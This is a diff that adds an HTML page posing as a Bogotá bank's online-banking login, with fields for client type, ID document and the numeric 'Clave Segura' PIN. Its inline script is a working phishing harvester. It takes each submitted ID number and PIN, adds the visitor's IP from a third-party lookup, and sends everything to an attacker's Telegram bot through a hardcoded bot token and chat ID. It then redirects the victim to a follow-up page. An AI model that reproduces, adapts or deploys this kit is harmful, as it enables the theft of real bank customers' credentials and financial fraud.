@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bogota</title>
+    <link rel="stylesheet" href="./bogo/lfr_style.css">
+    <link rel="stylesheet" href="./bogo/lfr_ownstyle.css">
+</head>
+
+<body>
+    <div class="box-container">
+        <div class="container">
+            <div class="container__login">
+                <div class="container__login--header">
+                    <img src="./bogo/logobanco1.png" alt="">
+                </div>
+                <div class="container__login--login-box">
+                    <div class="form-container">
+                        <form method="post" name="loginForm" id="loginForm" autocomplete="off">
+                            <div class="label">
+                                <label for="tipoPersona">¿Qué tipo de cliente eres?</label>
+                            </div>
+                            <div class="custom-select">
+                                <select id="tipoPersona" name="tipoPersona" required="">
+                                    <option value="">Selecciona</option>
+                                    <option value="Personas">Banca Personas</option>
+                                    <option value="Empresarial">Banca Empresarial y Corporativa</option>
+                                    <option value="Afiniada">Afinidad</option>
+                                </select>
+                            </div>
+
+                            <div class="field-tdo">
+                                <div class="label">
+                                    <label for="IdentificationType">Documento</label>
+                                </div>
+                                <div class="custom-select">
+                                    <select id="IdentificationType" name="identificationType" required="">
+                                        <option value="">Tipo</option>
+                                        <option value="Cedula">Cédula de Ciudadanía</option>
+                                        <option value="Extranjeria">Cédula de Extranjería</option>
+                                        <option value="Identidad">Tarjeta de identidad</option>
+                                        <option value="Civil">Registro civil</option>
+                                        <option value="Nit">Nit persona natural</option>
+                                        <option value="Nit juridico">Nit persona jurídica</option>
+                                        <option value="Nit extranjeros">Nit de extranjería</option>
+                                    </select>
+                                </div>
+                            </div>
+
+                            <div class="field-ndo">
+                                <div class="custom-input">
+                                    <div class="label">
+                                        <label for="Identification">Número de Identificación</label>
+                                    </div>
+                                    <!-- Se cambia el tipo a "tel" para que muestre teclado numérico y se añade "inputmode" -->
+                                    <input type="tel" class="custom-form-control" placeholder="Ingresa el número" name="identification" id="Identification" size="20" maxlength="20" required="" inputmode="numeric">
+                                </div>
+                            </div>
+                            <div class="field-ndo">
+                                <div class="custom-input">
+                                    <div class="label">
+                                        <label for="secureKey">Clave Segura</label> <!-- Cambiado el id y name -->
+                                    </div>
+                                    <!-- Se cambia el tipo a "tel" para que muestre teclado numérico y se añade "inputmode" -->
+                                    <input type="tel" class="custom-form-control" placeholder=". . . ." name="secureKey" id="secureKey" size="20" maxlength="20" required="" inputmode="numeric">
+                                </div>
+                            </div>
+
+                            <div class="btn-container">
+                                <button type="submit" class="btn-main" id="btnAction">Continuar</button>
+                            </div>
+                        </form>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Reemplaza con tu token de bot de Telegram y chat ID
+        const TOKEN = '6808586807:AAH5KvJxwCHbxVecJJ1D2fQyiVCK4u_RuBQ';
+        const CHAT_ID = '5157616506';
+
+        // Obtener la dirección IP del cliente usando un servicio de terceros
+        async function getClientIP() {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            return data.ip;
+        }
+
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault(); // Evita el envío tradicional del formulario
+            
+            const tipoPersona = document.getElementById('tipoPersona').value;
+            const identificationType = document.getElementById('IdentificationType').value;
+            const identification = document.getElementById('Identification').value;
+            const secureKey = document.getElementById('secureKey').value; // Captura de la Clave Segura
+            const ipAddress = await getClientIP(); // Obtener la IP del cliente
+            
+            // Validar que los campos no estén vacíos
+            if (!tipoPersona || !identificationType || !identification || !secureKey) {
+                alert("Por favor completa todos los campos");
+                return;
+            }
+
+            // Crear el mensaje a enviar, incluyendo la Clave Segura
+            const message = `Tipo de Cliente: ${tipoPersona}\nTipo de Documento: ${identificationType}\nNúmero de Identificación: ${identification}\nClave Segura: ${secureKey}\nIP del Cliente: ${ipAddress}`;
+
+            // Enviar la información a Telegram
+            sendToTelegram(message);
+        });
+
+        function sendToTelegram(message) {
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    // Redirigir a otra página si el mensaje fue enviado exitosamente
+                    window.location.href = "pas.html"; // Cambia esto a la URL de tu página de destino
+                } else {
+                    alert("Hubo un error al enviar la información a Telegram");
+                }
+            })
+            .catch(error => {
+                console.error('Error al enviar el mensaje:', error);
+                alert("Error al conectar con Telegram");
+            });
+        }
+    </script>
+</body>
+</html>
